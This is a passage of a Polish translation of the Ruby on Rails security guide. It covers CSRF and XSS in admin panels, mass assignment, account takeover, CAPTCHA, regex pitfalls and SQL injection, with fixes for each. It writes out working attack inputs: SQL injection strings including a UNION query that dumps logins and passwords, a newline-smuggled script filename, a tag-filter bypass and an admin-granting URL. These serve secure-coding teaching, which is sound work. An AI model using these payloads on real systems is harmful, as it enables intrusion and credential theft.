W 2007 roku pojawił się pierwszy, wykonany na zamówienie http://www.symantec.com/enterprise/security_response/weblog/2007/08/a_monster_trojan.html [Trojan], który ukradł informacje z Intranetu, czyli "Potwór dla pracodawców” strony internetowej Monster.com – strony do rekrutacji online. Indywidualnie stworzone Trojany są bardzo rzadkie, jak dotąd, a ryzyko ich użycia przeciw aplikacjom jest dość niskie, ale jest taka możliwość i jest to też przykład jak bezpieczeństwo hosta klienta jest ważne. Jednak najwyższe zagrożenie dla Intranetu i panelów Administracyjnych pochodzi z XSS i CSRF.  

*XSS*  Jeśli aplikacja ponownie wyświetla dane wejściowe złośliwego użytkownika z ekstranetu, aplikacja będzie podatny na XSS. Nazwy użytkowników, komentarze, spam raporty, adresy kolejności – to tylko kilka przykładów, które można zaatakować przez XSS. 

Nawet jedno miejsce w interfejsie administratora lub Intranecie, w którym dane wejściowe nie zostały sprawdzone, sprawia, że cała aplikacja staje się wrażliwa na atak. Atakującemu umożliwia to kradzież uprzywilejowanych cookies administratora, wstawianie kodu IFRAME, żeby wykraść hasła administratora lub instalowanie złośliwego oprogramowania poprzez luki w zabezpieczeniach przeglądarki w celach przejęcia kontroli nad komputerem administratora. 

Zapoznaj się z sekcją o atakach i ochronie przed XSS. [#,fffcdb]#Zalecane jest korzystanie z wtyczki SafeErb# również w intranecie lub interfejsie administratora. 

*CSRF*  Cross-Site Reference Forgery (CSRF) jest bardzo groźną metodą ataku. Pozwala ona atakującemu zrobić dokładnie to samo, co administrator lub użytkownik intranetu. Wcześniej dowiedziałeś się jak działa CSRF, a teraz czas na kilka przykładów:
 
W świecie rzeczywistym przykładem jest http://www.symantec.com/enterprise/security_response/weblog/2008/01/driveby_pharming_in_the_ wild.html[rekonfiguracja routera przez CSRF]. Atakujący rozesłał złośliwe maile z CSRF do meksykańskich użytkowników. E-mail informował o e-kartce czekającej na użytkowników, ale zawierał również Tag obrazka, które poprzez żądanie http-GET miał rekonfigurować router użytkownika (który jest popularnym modelem w Meksyku). Żądanie zmieniało ustawienia DNS w ten sposób, że żądania wysyłane do Meksykańskiego banku były mapowane do witryny atakującego. Każdy, kto odwiedził witrynę banku za pośrednictwem tego routera trafiał do fałszywej strony atakującego, a jego listy uwierzytelniające zostały skradzione. 

Inny przykład zmieniał e-mail i hasło do Google Adsense przez http://www.0x000000.com/index.php?i=213&bin=11010101 [CSRF]. Jeżeli ofiara była zalogowana do programu Google Adsense, interfejsu administracyjnego kampanii reklamowych Google, atakujący mógł zmienić jego listy uwierzytelniające.  

Innym popularnym atakiem jest spamowanie twojej strony, bloga lub forum, w celu rozprzestrzenienia złośliwego XSS. Oczywiście, osoba atakująca musi znać strukturę URL, ale większość tych wykorzystywanych przez Railsy jest dość prosta, lub łatwa do odgadnięcia, jeśli jest to jeden z open sourcowych interfejsów administracyjnych. Atakujący może zrobić nawet do 1000 szczęśliwych trafów zawierając złośliwe IMG-tagi które próbują każdej możliwej kombinacji.

Informacje o [#,fffcdb]#ochronie przeciwko CSRF w interfejsach administracyjnych i aplikacjach intranetowych, znajdują się w dziale o ochronie przeciw CSRF#. 
  
=== Dodatkowe środki ostrożności 

Przeciętny interfejs administracyjny działa tak: jest umieszczony w www.example.com/admin, może być dostępny tylko wtedy, gdy flaga administratora jest ustawiona w modelu użytkownika, ponownie wyświetla wejście użytkownika i pozwala adminowi usuwać/dodawać/edytować wszysto, na co ma ochotę. Oto kilka słów na ten temat:
 
- Bardzo ważne jest, [#,fffcdb]#żeby myśleć o najgorszym przypadku#: Co zrobić, jeśli ktoś naprawdę przejmie moje pliki cookie lub poświadczenia użytkownika. Można [#,fffcdb]#wprowadzić role# dla interfejsu administratora, aby ograniczyć możliwości atakującego. A może [#,fffcdb]#specjalne poświadczenie logowania# do interfejsu administratora, inne niż te używane do publicznej części aplikacji. Lub [#,fffcdb]#specjalne hasło do bardzo poważnych działań#?

- Czy admin naprawdę ma dostęp do interfejsu z każdego miejsca na świecie? Pomyśl o [#,fffcdb]#ograniczeniu logowania na kilka adresów IP#. Zbadaj request.remote_ip, aby dowiedzieć się o adresach IP użytkowników. Nie gwarantuje to stu procentowej ochrony, ale na pewno stanowi dużą przeszkodę. Pamiętaj, że ktoś może używać serwera Proxy.
 
- [#,Fffcdb]#Umieść specjalny interfejs administracyjny w sub-domenie# takiej jak admin.application.com i stwórz z niej odrębną aplikację, z własnym zarządzaniem uzytkownikami. To sprawia, że kradzież cookie admina ze zwykłej domenie www.application.com jest niemożliwa. Wynika to z konceptu „same origin Policy” w przeglądarce: skrypt (XSS) wstawiony na stronie www.application.com nie może odczytać cookie z admin.application.com i vice versa.
 
== Masowe przypisanie

-- _Bez zachowania środków ostrożności Model.new(params[:model]) pozwala atakującemu na ustawienie wartości każdej kolumnie w bazie danych._
  
Masowe przypisanie może stać się problemem, ponieważ umożliwia atakującemu ustawienie atrybutów każdego modelu poprzez manipulację hash przekazanego do metody nowego modelu():

[source, ruby]
----------------------------------------------------------------------------
def signup
  params[:user] #=> {:name => “ow3ned”, :admin => true}
  @user = User.new(params[:user])
end
----------------------------------------------------------------------------

Masowe przypisanie może zaoszczędzić ciężkiej pracy, ponieważ nie musisz ustawiać wszystkich wartości indywidualni. Wystarczy przekazać hash do metody new() lub przypisać atrybuty=(atrybuty) wartość hash, aby ustawić atrybuty modelu do wartości w hashu. Problemem jest, że jest to często używane w połączeniu z parametrami (params) hasha dostępnego w kontrolerze, który może być manipulowany przez atakującego. Może to zrobić poprzez zmianę adresu URL w taki sposób:
 
..........
http://www.example.com/user/signup?user[name]=ow3ned&user[admin]=1
..........
 
Pozwoli to ustalić następujące parametry w kontrolerze:
 
[source, ruby]
----------------------------------------------------------------------------
params[:user] #=> {:name => “ow3ned”, :admin => true}
----------------------------------------------------------------------------

Więc tworząc nowego użytkownika za pomocą masowego przypisania, w prosty sposób można stać się administratorem.
 
=== Sposoby ochrony

Aby tego uniknąć, Railsy oferują dwie klasowe metody w klasie ActiveRecord do kontroli dostępu do atrybutów. Metoda attr_protected stanowi listę atrybutów, które nie będą dostępne dla masowego przypisania. Na przykład:
 
[source, ruby]
----------------------------------------------------------------------------
attr_protected :admin
----------------------------------------------------------------------------
 
O wiele lepsze rozwiązanie, kierujące się zasadą białej listy to [#,fffcdb]#metoda attr_accessible#. Jest dokładne naprzeciwieństwo attr_protected, ponieważ [#,fffcdb]#dotyczy listy atrybutów, które będą dostępne#. Wszystkie inne atrybuty będą chronione. W ten sposób nigdy nie zapomnisz o ochronie atrybutów podczas ich dodawania nowych w trakcie rozwoju. Oto przykład:

[source, ruby]
----------------------------------------------------------------------------
attr_accessible :name
----------------------------------------------------------------------------

Jeśli chcesz ustawić atrybut chroniony, będziesz musiał przypisać go indywidualnie: 
 
[source, ruby]
----------------------------------------------------------------------------
params[:user] #=> {:name => "ow3ned", :admin => true}
@user = User.new(params[:user])
@user.admin #=> false # not mass-assigned
@user.admin = true
@user.admin #=> true
----------------------------------------------------------------------------
 
== Zarządzanie użytkownikami

-- _Prawie każda aplikacja internetowa ma do czynienia z uwierzytelnianiem i autoryzacją. Zamiast kroczenia własną drogą, wskazane jest stosowanie typowych wtyczek (pluginów). Ale ważne jest, aby je aktualizować. Kilka dodatkowych środków ostrożności sprawi, że twoja aplikacja będzie jeszcze bezpieczniejsza._ 

Istnieje kilka wtyczek obsługujących uwierzytelnianie i autoryzację, dostępnych w Railsach. Te lepsze zapisują tylko zaszyfrowane hasła, a nie te czysto tekstowe. Najbardziej popularną wtyczką jest [#,fffcdb]#restful_authentication#, która chroni również przed atakami typu session fixation. Jednak wcześniejsze wersje dopuszczały do logowanie bez nazwy użytkownika i hasła w niektórych okolicznościach.
 
Każdy nowy użytkownik otrzymuje kod aktywacyjny, aby aktywować swoje konto. Link do aktywacji wysyłany jest w mailu. Po aktywacji konta, kolumna activation_code w bazie danych będzie ustawiona na NULL. Jeśli ktoś wyśle żądanie o taki URL, będzie zalogowany jako pierwszy aktywowany użytkownika, jakiego można znaleźć w bazie danych (i są szanse, że będzie to administrator):
 
..........
http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=
..........
 
Jest to możliwe, gdyż na niektórych serwerach parametr id, tak jak w params[:id], miałby wartość nil. Jednakże, oto wyszukiwarka z akcji aktywacji: 

[source, ruby]
----------------------------------------------------------------------------
User.find_by_activation_code(params[:id])
----------------------------------------------------------------------------

Jeśli parametr miałby wartość nil, wynikające zapytanie SQL będzie takie: 
 
..........
SELECT * FROM users WHERE (users.`activation_code` IS NULL) LIMIT 1
..........
 
I tak wyszukiwarka znalazła pierwszego użytkownika w bazie danych, zwróciła go i został zalogowany. Więcej możesz przeczytać na http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/[moim blogu]. [#,fffcdb]#Od czasu do czasu Powinieneś aktualizować swoje wtyczki#. Ponadto możesz przeglądnąć swoją aplikację, żeby znaleźć więcej takich wad.

=== Ataki typu brute-force na konta użytkowników
 
-- _Ataki typu brute-force na dane logowania użytkowników są robione metodą prób i błędów. Możesz odpierać je stosując bardziej ogólne komunikaty o błędach i ewentualnie wymagać wprowadzania CAPTCHA._

Lista nazw użytkowników dla aplikacji internetowej może być wykorzystana do ataku typu brute-force na odpowiadające hasła, ponieważ większość ludzi nie używa wyszukanych haseł. Większość haseł stanowi połączenie wyrazów ze słownika i ewentualnie numerów. Uzbrojony w listę nazw użytkowników i w słownik, automatyczny program może znaleźć odpowiednie hasło w ciągu kilku minut.

Z tego powodu, większość aplikacji internetowych wyświetli ogólny komunikat o błędzie "Błędna nazwa użytkownika lub hasło", jeśli jedna z nich nie jest poprawna. Jeśli komunikat brzmi: "Wpisana nazwa użytkownika nie została znaleziona", atakujący mógłby automatycznie sporządzić listę nazw użytkowników. 
 
Jednak tym, co najczęściej zaniedbują projektanci aplikacji internetowych, są strony z zapomnianymi hasłami . Strony te często przyznają, że wpisana nazwa użytkownika lub adres e-mail (nie) została znaleziona. To pozwala atakującemu na skompilowanie listy nazw użytkowników i atak typu brute-force na ich konta.
 
W celu złagodzenia takich ataków, [#,fffcdb]#wyświetlaj ogólne komunikat o błędzie, również na stronach z zapomnianymi hasłami#. Ponadto, możesz [#,fffcdb]#wymagać, aby wprowadzić CAPTCHA po kilku błędów logowania z pewnego adresu IP#. Należy jednak pamiętać, że nie jest to stu procentowa ochrona przed automatycznymi programami, ponieważ te programy mogą bardzo często zmieniać adres IP. Jednakże zwiększa do poziom ochrony przed atakiem.
 
=== Przejęcie konta użytkownika

-- _Wiele aplikacji internetowych ułatwiają przejęcie kont użytkowników. Dlaczego by nie zrobić na odwrót i tego nie utrudnić?_

==== Hasła
 
Pomyśl o sytuacji, gdy atakujący posiada skradzione cookie sesji użytkownika, a zatem może wspólnie z użytkownikiem używać aplikacji. Jeżeli zmiana hasła jest łatwa, atakujący będzie mógł przejąć konto w kilku kliknięciach. Lub jeżeli formularz zmiany hasła jest podatny na atak CSRF, atakujący będzie mógł zmienić hasło ofiary wabiąc ją do strony internetowej, gdzie jest spreparowany IMG-tag, który odpala CSRF. Można temu zaradzić i [#,fffcdb]#stworzyć formularz zmiany hasła odporny na CSRF#. I [#,fffcdb]#wymagać od użytkownika, aby wprowadzał stare hasło przy jego zmianie#.
 
==== Maile
 
Jednakże, atakujący może również przejąć konto zmieniając adres e-mail. Po jego zmianie, przejdzie na stronę z zapomnianym hasłem i (prawdopodobnie nowy) hasło zostanie wysłane na adres e-mail atakującej osoby. Żeby temu zaradzić, można[#,fffcdb]#wymagać od użytkownika, aby wprowadził hasło przy zmianie adresu e-mail#. 

==== Inne

W zależności od Twojej aplikacji internetowej, może być więcej sposobów na przejęcie konta użytkownika. W wielu przypadkach można to zrobić za pomocą XSS i CSRF. Na przykład, podatność na CSRF w http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/ [Google Mail]. W dowodzie koncepcji (proof-of-concept) tego ataku, ofiara miała być zwabiona do witryny internetowej kontrolowanej przez atakującego. Na tej stronie jest spreparowany IMG-tag, którego skutkiem jest żądanie HTTP GET,  zmieniające ustawienia filtru w Google Mail. Jeżeli ofiara byłaby zalogowana na Google Mail, atakujący zmieniłby filtry i ustawił przekazywanie wszystkich wiadomości e-mail na jego adres e-mail. Jest to prawie tak szkodliwe, jak przejęcie całego konta. Można temu zaradzić [#,fffcdb]#przeglądając logikę aplikacji i eliminując wszystkie luki wrażliwe na XSS i CSRF#.
 
=== CAPTCHA
  
-- _CAPTCHA jest testem typu challenge-response w celu ustalenia, że odpowiedź nie jest generowana przez komputer. Jest często używany do ochrony formularzy komentarza przed automatycznymi spam-botami. CAPTCHA prosi użytkownika o wypisanie liter z zniekształconego obrazka. Pomysł negatywnego CAPTCHA nie jest po to by udowadniać, że użytkownik jest człowiekiem, lecz po to, by ujawniać, że robot jest robotem._

Ale nie tylko spam roboty (boty) są problemem. Boty automatycznie logogujące również są problematyczne. Popularnym CAPTCHA API jest http://recaptcha.net/[reCAPTCHA], który wyświetla dwa zniekształcone obrazy zawierające słowa ze starych książek. reCAPTCHA dodaje również ukośne linie, zamiast zniekształcania tła i wysokiego poziomu wyginania tekstu jak to było w przypadku wcześniejszych CAPTCHA, które zostały złamane. Jako dodatek, używanie reCAPTCHA pomaga w tworzeniu cyfrowych wersji starych książek. http://ambethia.com/recaptcha/[ReCAPTCHA] jest także Railsową wtyczką, o takiej samej nazwie jak API.

Otrzymasz dwa klucze od API, publiczny i prywatny, który trzeba umieścić w swoim środowisku Railsowym. Po tym możesz użyć metody recaptcha_tags w widoku i metody verify_recaptcha w kontrolerze. Verify_recaptcha zwróci false, jeżeli walidacja zawiedzie. 
Problem z CAPTCHA jest taki, że są irytujące. Ponadto, niektórzy niedowidzący użytkownicy uznali, że niektóre rodzaje zniekształcenia CAPTCHA są trudne do odczytania. Pomysł negatywnego CAPTCHA nie jest po to by udowadniać, że użytkownik jest człowiekiem, lecz po to, by ujawniać, że robot jest robotem.
 
Większość botów jest naprawdę głupia – przeszukują sieć i umieszczają spam w każdym znalezionym polu formularza. Negatywne CAPTCHA wykorzystują to i umieszczają pole "honeypot" w formularzu, które będzie ukryte przed człowiekiem przez CSS lub JavaScript.  

Oto kilka pomysłów, jak ukryć pola honeypot przez JavaScript i/lub CSS: 
  
- Umieszczenie pola poza widocznym obszarem strony 
- Stworzenie bardzo małych elementów lub w tym samym kolorze, co tło strony 
- Zostaw pola widoczne, ale poinformuj ludzi, żeby pozostawić je puste 

Najprostsze negatywne CAPTCHA to te, ukryte w polach honeypot. Po stronie serwera, sprawdzana jest wartość pola: Jeśli zawiera tekst, to musi być bot. Następnie można zignorować dodany post, lub zwrócić pozytywny wynik, ale nie zapisywać posta w bazie danych. W ten sposób bot będzie zadowolony i przejdzie dalej. Można to również zrobić z irytującymi użytkownikami. 

Bardziej wyrafinowane negatywne CAPTCHA możesz znaleźć na http://nedbatchelder.com/text/stopbots.html [blogu Batchelder Ned’a]: 
 
- Dołącz pole z aktualnym znacznikiem czasowym UTC i sprawdź go na serwerze. Jeżeli jest on zbyt daleko w przeszłości, lub w przyszłości, formularz jest nieprawidłowy. 
- Nazwy pól dobieraj losowo 
- Umieszczaj więcej niż jedno pole honeypot we wszelkich rodzajach, również w przycisku wysyłania. 

Zauważ, że to chroni Cię jedynie przed automatycznymi botami, specjalnie wykonane roboty nie mogą być w ten sposób zatrzymane. Więc CAPTCHA może okazać się nienajlepszym sposobem by chronić formularze logowania. 

=== Logowanie
 
-- _Postaraj się, żeby Railsy nie wpisywały haseł w rejestrze._

Domyślnie Railsy rejestrują wszystkie żądania do strony internetowej. Ale rejestry mogą stanowić ogromny problem związany z zabezpieczeniami, ponieważ mogą one zawierać dane logowania, numery kart kredytowych itp. Podczas projektowania konceptu bezpieczeństwa aplikacji internetowej, należy pomyśleć o tym, co się stanie, gdy atakujący będzie miał (pełny) dostęp do serwera WWW. Szyfrowanie klucze i hasła w bazie danych będą bezużyteczne, jeżeli rejestr wylistuje je jako zwykły tekst. Możesz [#,fffcdb]#filtrować niektóre parametry żądań z rejestru# dzięki metodzie w kontrolerze filter_parameter_logging. Parametry te będą oznaczone [filtrowane] w rejestrze.
 
[source, ruby]
----------------------------------------------------------------------------
filter_parameter_logging :password
----------------------------------------------------------------------------
 
=== Dobre hasła
 
-- _Czy ciężko Ci zapamiętać wszystkie hasła? Nie zapisuj ich, lecz korzystaj z pierwszych liter wyrazów w łatwym do zapamiętania zdaniu._

Bruce Schneier, technolog zabezpieczeń, http://www.schneier.com/blog/archives/2006/12/realworld_passw.html [przeanalizował] 34000 występujących w świecie rzeczywistym nazw użytkowników i haseł ze wspomnianej wcześniej próby wyłudzenia danych z MySpace. Okazuje się, że większość haseł jest dość łatwa do złamania. Oto 20 najpopularniejszych haseł: 

password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1 and monkey.

Interesujący jest fakt, że tylko 4% tych haseł to słownikowe wyrazy i większość to hasła alfanumeryczne. Jednak słowniki crackerów haseł zawierają wiele dzisiejszych haseł i próbują wszystkich (alfanumerycznych) kombinacji. Jeśli atakujący zna nazwę użytkownika, który używa słabego hasła, w łatwy sposób można dokonać włamania. 

Dobrym hasłem jest długa mieszanka alfanumerycznych kombinacji różnego rodziaju. Ponieważ jest to dość trudne do zapamiętania, jest wskazane, aby zapisać tylko [#,fffcdb]#pierwsze litery zdania, która można łatwo zapamiętać#. Na przykład "Szybki brązowy lis przeskoczył nad leniwym psem" będzie "Sblpnlp". Zauważ, że jest to tylko przykład, nie należy używać znanego wyrażenia, które może pojawić się w słowniki crackera.
 
=== Wyrażenia regularne
 
-- _Powszechną pułapką w wyrażeniach regularnych w Ruby jest dopasowanie ciągu na początku i na końcu przez ^ i $, zamiast \A i \z._ 

Ruby używa nieco innego podejścia niż w wielu innych językach, aby dopasować koniec i początek ciągu znaków. Dlatego nawet w książkach o Ruby i Railsach popełnia się błędy. Więc w jaki sposób może to zagrażać bezpieczeństwu? Wyobraź sobie, że masz model pliku i walidujesz nazwę pliku przez wyrażenie regularne w taki sposób:
 
[source, ruby]
----------------------------------------------------------------------------
class File < ActiveRecord::Base
  validates_format_of :name, :with => /^[\w\.\-\+]+$/
end
----------------------------------------------------------------------------

Oznacza to, że model potwierdzi nazwę pliku składającą się tylko ze znaków alfanumerycznych, kropek, + i -. I programista dodaje \^ i $ tak, że nazwa pliku będzie zawierać te znaki od początku do końca łańcucha. Jednakże [#,fffcdb]#w Ruby ^ i $ odpowiada *line* początkowi i końcu linii#. A więc taka nazwa pliku przechodzi przez filtr bez problemów: 

..........
file.txt%0A<script>alert('hello')</script>
..........
 
Jak %0A jest feedem linii w kodowaniu URL, tak w Railsach automatycznie konwertuje je do "file.txt\n<script>alert(‘Hello’)</script>". Ta nazwa pliku przechodzi przez filtr, gdyż wyrażenie regularne pasuje - do końca linii, reszta nie ma znaczenia. Prawidłowe wyprażenie powinno brzmieć:
 
[source, ruby]
----------------------------------------------------------------------------
/\A[\w\.\-\+]+\z/
[source, ruby]
----------------------------------------------------------------------------

=== Eskalacja przywilejów
  
-- _Zmiana pojedynczego parametru może dać użytkownikowi nieautoryzowany dostęp. Pamiętaj, że każdy parametr może ulec zmianie, bez względu na to jak bardzo go ukrywasz zacierasz._ 

Najpopularniejszym parametrem, który użytkownik może modyfikować, jest parametr id, jak w http://www.domain.com/project/1+, gdziet 1 jest identyfikatorem. Jest on dostępny w params[:id] w kontrolerze. Najprawdopodobniej będziesz mógł teraz zrobić coś takiego: 
 
[source, ruby]
----------------------------------------------------------------------------
@project = Project.find(params[:id])
----------------------------------------------------------------------------

Jest to w porządku dla niektórych aplikacji internetowych, ale z pewnością nie w przypadku, gdy użytkownik nie ma uprawnień, aby zobaczyć wszystkie projekty. Jeśli użytkownik zmienia id na 42 i nie jest uprawniony do przeglądania informacji, to i tak będzie miał do nich dostęp. Zamiast tego[#,fffcdb]#pytaj również o prawa dostępu użytkownika#: 

[source, ruby]
----------------------------------------------------------------------------
@project = @current_user.projects.find(params[:id])
----------------------------------------------------------------------------

W zależności od twojej aplikacji internetowej, może być o wiele więcej parametrów, które użytkownik może modyfikować. Przyjmij zasadę, że [#,fffcdb]#żadne dane wejściowe użytkownika nie są bezpieczne, dopóki nie zostanie udowodnione, że jest inaczej. Użytkownik może manipulować każdym parametrem#. 
 
Nie daj się nabrać na ściemnione bezpieczeństwo i bezpieczeństwo JavaScript. Toolbar progamisty dla przeglądarki Mozilla Firefox pozwala przejrzeć i zmienić każde ukryte pole formularza. [#,fffcdb]#JavaScript może być wykorzystywany w celu weryfikacji danych użytkownika, ale z pewnością nie po to, by zapobiec wysyłaniu złośliwych żądań z nieoczekiwanymi wartościami#. Wtyczka Live Http Headers do przeglądarki Mozilla Firefox rejestruje każde żądanie, może go powtarzać i zmieniać. Jest to prosty sposób na ominięcie wszelkich walidacji przez JavaScript. Są też nawet proxy po stronie klienta, które pozwalają na przechwytywanie wszelkich żądań i odpowiedzi z i do Internetu. 
 
== Atak typu Injection
  
- _Klasa ataków typu ijection polega na wprowadzeniu złośliwego kodu lub parametrów do aplikacji internetowej w celu uruchomienia jej w kontekście jej bezpieczeństwa. Czołowy przykład ataku typu injection jest atak cross-site scripting (XSS) I atak typu SQL injection._ 

Atak typu injection jest bardzo podstępny, ponieważ ten sam kod lub parametr może być złośliwy w jednym kontekście, ale całkowicie nieszkodliwy w innym. Kontekstem może być kodowanie, zapytania lub język programowania, powłoka (Shell) lub metoda w Ruby/Rails. Poniższe sekcje będą obejmować wszystkie ważne konteksty gdzie mogą wystąpić ataki typu injection. Pierwsza część obejmuje architektoniczne decyzje w związku z atakiem typu injection. 
 
=== Białe listy vs Czarne listy
  
-- _Przy poprawianiu, ochronie lub sprawdzeniu czegoś, białe wygrywają z czarnymi listami._

Czarna lista może być zbiorem złych adresów e-mail, niepublicznych działań lub złych tagów HTML. Jest przeciwieństwem do białej listy, która zawiera dobre adresy e-mail, publiczne działania, dobre znaczniki HTML i tak dalej. Chociaż czasami nie jest możliwe stworzenie białej (na przykład filtr antyspamowy), [,#fffcdb]#lepiej używać białej list#: 
 
- Korzystaj z: before_filter:only => [...] zamiast: expect => [...]. W ten sposób nie zapomnisz go wyłączyć dla świeżo dodanych akcji. 
- Korzystaj z: attr_accessible zamiast: attr_protected. Szczegóły znajdziesz w sekcji o masowym przypisaniu. 
- Zezwól na <strong> zamiast usuwania <script> przeciwko Cross-Site Scripting (XSS). Zobacz poniżej. 
- Nie próbuj poprawiać wejścia użytkownika przez czarne listy: 
   * W ten sposób atak będzie działał tak: "<sc<script>ript>".gsub("<script>", "")
   * Ale odrzucaj nieprawidłowe wejście 
 
Białe są również dobre w przypadku gdy ludzie zapominają pewnych rzeczy umieścić na czarnych listach. 

=== Atak typu SQL Injection
  
-- _Dzięki zmyślnym metodom, ten problem zniknął już z większości aplikacji Railsowych. Jest to jednak bardzo niszczycielski i powszechny atak na aplikacje internetowe, więc ważne jest, aby zrozumieć problem._ 

==== Wstęp
  
Atak typu SQL injection ma na celu wpływanie na zapytania do bazy danych poprzez manipulowanie parametrami aplikacji internetowej. Popularnym celem ataków typu SQL injection jest ominięcie autoryzacji. Kolejnym celem jest manipulacja danymi lub odczyt dowolnych danych. Oto przykład, jak nie używać danych wejściowych użytkownika w zapytaniu: 

[source, ruby]
----------------------------------------------------------------------------
Project.find(:all, :conditions => "name = '#{params[:name]}'")
----------------------------------------------------------------------------

Może to być w akcji wyszukiwania i użytkownik może wpisać nazwę projektu, który chce znaleźć. Jeśli złośliwy użytkownik wpisze ' OR 1=1', wynikiem zapytania SQL będzie:
 
..........
SELECT * FROM projects WHERE name = '' OR 1 --'
..........
 
Dwie kreski rozpoczynają komentarz ignorując wszystko po nim. Zatem zapytanie zwraca wszystkie rekordy z tabeli projekty, w tym te niewidoczne dla użytkownika. Dzieje się tak, ponieważ warunek jest prawdziwy dla wszystkich rekordów.
 
==== Pominięcie autoryzacji
 
Zwykle aplikacja internetowa zawiera kontrolę dostępu. Użytkownik wprowadza jego dane logowania, a aplikacja próbuje znaleźć pasujący rekord w tabeli użytkowników. Aplikacja zapewnia dostęp, jeżeli znajdzie rekord. Jednakże, osoba atakująca może ewentualnie pominąć ten krok poprzez atak SQL injection. Poniżej pokazane jest typowe zapytanie do bazy danych w Railsach w celu znalezienia pierwszego rekordu w tabeli użytkowników, który pasuje do parametrów logowania dostarczonych przez użytkownika. 

[source, ruby]
----------------------------------------------------------------------------
User.find(:first, "login = '#{params[:name]}' AND password = '#{params[:password]}'")
----------------------------------------------------------------------------
 
Jeżeli atakujący wprowadzi ' OR '1'='1 jako imię i ' OR '2'>'1 jako hasło, rezultat zapytania SQL będzie następujący:
 
.........
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
.........
 
To po prostu znajdzie pierwszego użytkownika w bazie danych i zapewni mu dostęp do aplikacji.
 
==== Nieautoryzowane czytanie
 
UNIA łączy dwa zapytania SQL i zwraca dane w jednym zestawie. Atakujący może jej użyć do odczytu arbitralnych danych z bazy danych. Weźmy przykład z góry: 
 
[source, ruby]
----------------------------------------------------------------------------
Project.find(:all, :conditions => "name = '#{params[:name]}'")
----------------------------------------------------------------------------

A teraz wprowadźmy inne zapytanie używając UNII: 
 
............
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
............
 
W rezultacie otrzymamy następujące zapytanie SQL:
 
............
SELECT * FROM projects WHERE (name = '') UNION 
  SELECT id,login AS name,password AS description,1,1,1 FROM users --')
............

Rezultatem nie będzie lista projektów (ponieważ nie ma projektu z pustym polem nazwy), tylko lista nazw użytkowników i ich hasła. Więc miejmy nadzieję, że zaszyfrowałeś hasła w bazie danych! Jedynym problemem dla atakującego jest to, że liczba kolumn musi być taka sama w obu zapytaniach. Dlatego drugie zapytanie zawiera listę jedynek (1), która zawsze będzie mieć wartość 1, w celu dopasowania liczby kolumn w pierwszym zapytaniu. 
 
Również drugie zapytanie zmienia nazwy niektórych kolumn korzystając z AS tak aby aplikacja internetowa wyświetlała wartości z tabeli użytkowników. Pamiętaj, aby zaktualizować Railsy http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/[przynajmniej do wersji 2.1.1]. 

 
==== Sposoby ochrony
 
Ruby on Rails jest wyposażone w specjalny filtr dla znaków SQL, do których należą znaki ucieczki ' , " , znak NULL i podziały wiersza. [,#Fffcdb]#Korzystając z Model.find(id) lub Model.find_by_something(coś) automatycznie stosujesz ochronę#. Ale fragmenty SQL, szczególnie [,#fffcdb]#fragmenty w conditions (:conditions => "..."), metody connection.execute() lub Model.find_by_sql() muszą być stosowane ręcznie#. 

Zamiast przekazywania ciągu do opcji conditions, możesz przekazać tablicę do oczyszczenia zanieczyszczonego ciągu znaków w taki sposób: 

[source, ruby]
----------------------------------------------------------------------------
Model.find(:first, :conditions => ["login = ? AND password = ?", entered_user_name, entered_password])
----------------------------------------------------------------------------

Jak widać, pierwsza część tablicy jest fragmentem SQL ze znakami zapytania. W oczyszczonej wersji zmienne w drugiej części tablicy zastąpiły znaki zapytania. To samo można zrobić z hashem: 
 
[source, ruby]
----------------------------------------------------------------------------
Model.find(:first, :conditions => {:login => entered_user_name, :password => entered_password})
----------------------------------------------------------------------------
 
Tablica lub formularz hasha jest dostępny tylko w instancjach modelu. Możesz spróbować +sanitize_sql()+ gdzie indziej. [,#fffcdb]#Nabierz nawyku myślenia o konsekwencjach dla bezpieczeństwa gdy korzystasz z zewnętrznego ciągu znaków w SQL#. 

=== Atak Cross-Site Scripting (XSS)

- _Najbardziej rozpowszechnionym i zarazem jednym z najbardziej niszczycielski dla aplikacji internetowych jest atak typu XSS. Ten złośliwy atak wprowadza wykonywalny kod po stronie klienta. Railsy dostarczają helpery, żeby się przed nim bronić._ 

 
==== Punkty wejścia

Punkt wejścia jest to podatny URL i jego parametry, gdzie atakujący może rozpocząć atak.

Najczęstszymi punktami wejścia są posty, komentarze użytkowników i księgi gości, ale tytuły projektów, nazwy dokumentów i strony z wynikami wyszukiwania również są narażone - niemal wszystkie miejsca, w których użytkownik może wprowadzać dane. Ale wejście nie musi pochodzić z pól wejścia na stronach internetowych. Może być to jakikolwiek parametr URL - nawet, ukryty lub wewnętrzny. Pamiętaj, że użytkownik może przechwycić jakikolwiek ruch. Aplikacje, takie jak http://livehttpheaders.mozdev.org/[wtyczka Live HTTP Headers Firefox] lub Proxy po stronie klienta ułatwiają zmianę żądania. 

Ataki XSS działają w taki sposób: Atakujący wprowadza jakiś kod, aplikacja internetowa zapisuje go i wyświetla na stronie, a później przedstawia ofiarze. Większość przykładów XSS prostu wyświetla okno ostrzegawcze (alert box), ale jest to dużo bardziej groźne. XSS może wykraść cookies, przechwytywać sesje; przekierowywać ofiary do fałszywej strony internetowej, wyświetlać reklamy na korzyść atakującego, zmieniać elementy na stronie internetowej, aby uzyskać poufne informacje lub instalować złośliwe oprogramowanie poprzez luki w przeglądarce internetowej. 

